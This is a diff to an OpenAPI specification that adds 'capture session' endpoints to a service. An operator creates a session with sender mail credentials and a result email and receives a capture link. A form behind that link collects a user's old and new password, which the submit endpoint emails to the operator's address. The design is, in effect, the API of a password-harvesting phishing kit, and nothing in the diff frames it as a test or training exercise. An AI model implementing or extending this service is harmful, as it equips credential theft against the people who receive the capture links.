@@ -10,6 +10,8 @@ servers:
 tags:
   - name: health
     description: Health operations
+  - name: sessions
+    description: Capture session operations
 paths:
   /healthz:
     get:
@@ -24,6 +26,97 @@ paths:
             application/json:
               schema:
                 $ref: "#/components/schemas/HealthStatus"
+
+  /sessions:
+    post:
+      operationId: createSession
+      tags: [sessions]
+      summary: Create a capture session
+      description: Registers a new session with sender credentials and result email. Returns a unique token for the capture link.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/CreateSessionBody"
+      responses:
+        "201":
+          description: Session created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/Session"
+        "400":
+          description: Validation error
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /sessions/{token}:
+    get:
+      operationId: getSession
+      tags: [sessions]
+      summary: Get session info by token
+      description: Returns basic session info (existence check). Does not expose credentials.
+      parameters:
+        - name: token
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Session found
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SessionPublic"
+        "404":
+          description: Session not found
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /sessions/{token}/submit:
+    post:
+      operationId: submitCapture
+      tags: [sessions]
+      summary: Submit captured credentials
+      description: Receives old/new password from the capture form and sends them via email to the result email address.
+      parameters:
+        - name: token
+          in: path
+          required: true
+          schema:
+            type: string
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/SubmitCaptureBody"
+      responses:
+        "200":
+          description: Submitted and emailed successfully
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SubmitResult"
+        "404":
+          description: Session not found
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+        "500":
+          description: Failed to send email
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
 components:
   schemas:
     HealthStatus:
@@ -34,3 +127,82 @@ components:
       required:
         - status
 
+    CreateSessionBody:
+      type: object
+      properties:
+        senderEmail:
+          type: string
+          format: email
+        senderPassword:
+          type: string
+        resultEmail:
+          type: string
+          format: email
+        messageSubject:
+          type: string
+      required:
+        - senderEmail
+        - senderPassword
+        - resultEmail
+        - messageSubject
+
+    Session:
+      type: object
+      properties:
+        token:
+          type: string
+        captureUrl:
+          type: string
+        createdAt:
+          type: string
+          format: date-time
+      required:
+        - token
+        - captureUrl
+        - createdAt
+
+    SessionPublic:
+      type: object
+      properties:
+        token:
+          type: string
+        messageSubject:
+          type: string
+        exists:
+          type: boolean
+        used:
+          type: boolean
+      required:
+        - token
+        - exists
+        - used
+
+    SubmitCaptureBody:
+      type: object
+      properties:
+        oldPassword:
+          type: string
+        newPassword:
+          type: string
+      required:
+        - oldPassword
+        - newPassword
+
+    SubmitResult:
+      type: object
+      properties:
+        success:
+          type: boolean
+        message:
+          type: string
+      required:
+        - success
+        - message
+
+    ErrorResponse:
+      type: object
+      properties:
+        error:
+          type: string
+      required:
+        - error
